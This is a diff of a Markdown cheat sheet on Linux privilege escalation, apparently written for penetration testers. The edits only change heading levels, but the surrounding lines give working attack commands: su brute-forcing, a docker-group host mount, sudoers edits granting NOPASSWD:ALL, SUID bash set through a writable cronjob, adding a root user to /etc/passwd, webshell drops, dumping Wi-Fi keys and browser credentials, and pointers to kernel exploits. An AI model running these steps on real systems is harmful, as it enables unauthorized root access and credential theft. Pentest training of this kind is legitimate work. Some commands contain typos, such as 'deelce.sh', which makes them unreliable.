@@ -20,14 +20,14 @@ The following techniques are examples and can be used to escape a restricted env
 - [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS): `./linpeas.sh -a | tee output.txt`
 
 ### __Abuse users & groups:__
-##### _Identify interesting users:_
+#### _Identify interesting users:_
 - 1\. Check what other interesting users are on the system:
 	- Current logged in users: `who`
 	- Previous logins: `last`
 	- Users with sudo rights: `grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'`
 - 2\. If user is part of a exploitable group or can run/access a service as root, try to compromise that user account\. 
 
-##### _Login as another user account:_
+#### _Login as another user account:_
 - Login with creds:
 	- Escalate to another user: `su <username>`
 	- If "su" is unavailable: `doas -u <username> /bin/sh`
@@ -35,11 +35,11 @@ The following techniques are examples and can be used to escape a restricted env
 	- 1\. Upload the compiled version of [sucrack](https://github.com/hemp3l/sucrack) and a passwordlist to the target system\. 
 	- 2\. Start bruteforce authentication attempts via su \(default is root user\): `./sucrack -w <threads (e.g. 5)> (-u <username>) passwordfile.txt`
 
-##### _Identify exploitable group memberships:_
+#### _Identify exploitable group memberships:_
 - 1\. Identify the groups the current user is part of: `id`
 - 2\. Check if the group may allow for privesc\. 
 
-##### Docker Group:
+#### _Docker Group:_
 If the current user is in the docker group or docker\.socks is writeable it is possible to mount a host partition inside the container to get root privileges\.
 - 1\. Enumerate the docker instance for vulnerbailities: 
 	- Automated enumeation: upload deepce\.sh to target host and run \([deepce](https://github.com/stealthcopter/deepce.git)\): `./deelce.sh `
@@ -60,7 +60,7 @@ If the current user is in the docker group or docker\.socks is writeable it is p
 		- 3\. Mount host partition to image \(if docker socket is in an unusual place use "\-H unix:///path/to/docker\.sock"\): `docker run -it -v /:/mnt/ <image name>:<tag name> chroot /mnt/ bash`
 
 ### __Abuse execution permissions:__ 
-##### _Sudoers privilege abuse:_
+#### _Sudoers privilege abuse:_
 In the /etc/sudoers file, extra permissions can be assigned to a specific user that may run specific or all commands with root privileges\. 
 - 1\. List services that current user can run with sudo privileges:
 	- `sudo -l`
@@ -82,7 +82,7 @@ In the /etc/sudoers file, extra permissions can be assigned to a specific user t
 			- 2\. In the sudoers file modify privileges for the current user: `<username> ALL=(ALL) NOPASSWD:ALL`
 			- 3\. Save changes and privesc to root: `sudo su`
 
-##### _SUID permission abuse:_
+#### _SUID permission abuse:_
 SUID/Setuid stands for "set user ID upon execution" and it is enabled by default in every Linux distributions\. If the file owner is root, the uid will be changed to root even if it was executed from a low privileged user\. SUID bit is represented by an ‘s’\.
 >SUID binary must be run without sudo\. It is recommended to use the "chmod u\+s /bin/bash" technique instead if spanning a new shell\. 
 - 1\. Check if the SUID bit is set on a binary \(looks like: \-rw\[s\]r\-xr\-x\): `find / -perm -4000 2>/dev/null | xargs ls -la`
@@ -99,12 +99,12 @@ SUID/Setuid stands for "set user ID upon execution" and it is enabled by default
         - 2\. Upload both the 'exploit' and 'evil\.so' files to the target system and give 'exploit' execution permissions: `chmod +x exploit`
         - 3\. Elevate to root: `./exploit`
 
-##### _Linux Capability abuse:_
+#### _Linux Capability abuse:_
 Capabilities in Linux are special attributes that can be allocated to processes, binaries, services and users and they can allow them specific privileges that are normally reserved for root\-level actions, such as being able to intercept network traffic or mount/unmount file systems\. If misconfigured, these could allow an attacker to elevate their privileges to root\.
 - 1\. List Linux Capabilities \(also lse\.sh will list them\): `getcap -r / 2>/dev/null`
 - 2\. Search if one of the binaries can be used for privilege escalation (e.g. python)`
 
-##### _Identify vulnerable local service:_
+#### _Identify vulnerable local service:_
 - 1\. Search for interesting services:
 	- Check for local running services: `netstat -tulpn`
 	- Check if the service is running in privileged context: `ps -aux | grep <PID>`
@@ -121,17 +121,17 @@ Capabilities in Linux are special attributes that can be allocated to processes,
 	- Web service like Apache: drop a webshell in the root web folder and activate it via the browser\. 
 
 ### __Abuse write permissions:__
-##### _Cronjob exploitation:_
+#### _Cronjob exploitation:_
 - 1\. Search for vulnerable cronjob files: 
 	- 1\. Search for files that are writeable by all users and run as root \(check if rwx permissions are set\): `find /etc/cron* -type f -perm -o+w -exec ls -l {} \;`
 	- 2\. pspy tool can give information about running jobs \(if the job is frequently executed\) \(tool must be uploaded first\) \([pspy64](https://github.com/DominicBreuker/pspy)\): `./pspy64`
 - 2\. Modify the found cronjob to execute an arbitrary command \(example set SUID bit for bash\): `echo \e ‘#!/bin/bash\n/bin/chmod u+s /bin/bash’> </path/to/cronjob (e.g. /etc/cron.hourly/oddjob)>`
 
-##### _Identify folder & file write permissions:_
+#### _Identify folder & file write permissions:_
 - Find writeable folders: `find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \; 2>/dev/null`
 - Find writeable files \(use 1 dir \(e\.g\. etc\) to search in each time for less verbose output\): `find /etc -type f \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \; 2>/dev/null`
 
-##### _Insecure file & folder permission abuse:_
+#### _Insecure file & folder permission abuse:_
 - /etc/passwd: for backwards compatibility, if a password hash is present in the second column of a /etc/passwd user record, it is considered valid for authentication and it takes precedence over the respective entry in /etc/shadow if available\.
 	- 1\. Check if you have write permissions for the "/etc/passwd" file 
 	- 2\. If yes, add new root user \(root2\) to the file: 
@@ -160,13 +160,13 @@ Capabilities in Linux are special attributes that can be allocated to processes,
 	- 2\. Run playbook or wait until its run by a privileged user: `ansible-playbook <playbook.yaml>`
 
 ### __Search for secrets on the local system:__
-##### _General file search queries:_
+#### _General file search queries:_
 - Search for files that are recently modified: `find /<dir (e.g. home) -type f -mmin -<minutes (e.g. 60)>`
 - Search for specific file type/name: `find /* -name "*.php" -print 2>/dev/null`
 - Search for a specific word in files \(example: db\_passwd, password\): `find . -type f -maxdepth 4 | xargs grep -i "<search term>"`
 - Check binary files for readable strings: `strings <file>` 
 
-##### _Interesting files to search for:_
+#### _Interesting files to search for:_
 - Check user command history \(search for mistakenly entered clear text passwords\): `history`
 - Check if you can access on of the following files that store hashed or encoded passwords:
     ```
@@ -184,13 +184,13 @@ Capabilities in Linux are special attributes that can be allocated to processes,
 - Dump cleartext Pre\-Shared Wireless Keys from Network Manager: `cat /etc/NetworkManager/system-connections/* |grep -E "^id|^psk"`
 - Ansible: check for hardcoded creds or other secrets in any stored playbooks \(playbooks have the \.yaml/\.yml extention\), backups and "/var/log/syslog" file\.
 
-##### _Dump stored web credentials/cookies:_
+#### _Dump stored web credentials/cookies:_
 This tool supports the most popular browsers on the market and runs on Windows, macOS and Linux\.
 - 1\. Run tool which stores all results in a new folder called "results" \([HackBrowserData](https://github.com/moonD4rk/HackBrowserData)\): `hack-browser-data -dir <path to store folder with results>`
 - 2\. Extract the interesting files back to your system and start analysing\. 
 
 ### __System exploitation:__
-##### _Exploit vulnerable kernel:_
+#### _Exploit vulnerable kernel:_
 - 1\. List kernel version: `uname -a`
 - 2\. Search if the kernel is vulnerable and download the PoC or choose one of the below reliable exploits:
     - Ubuntu 12\.04\.2: [perf\_swevent\_init \- Linux Kernel <  3\.8\.9 \(x86\-64\)](https://www.exploit-db.com/exploits/26131)
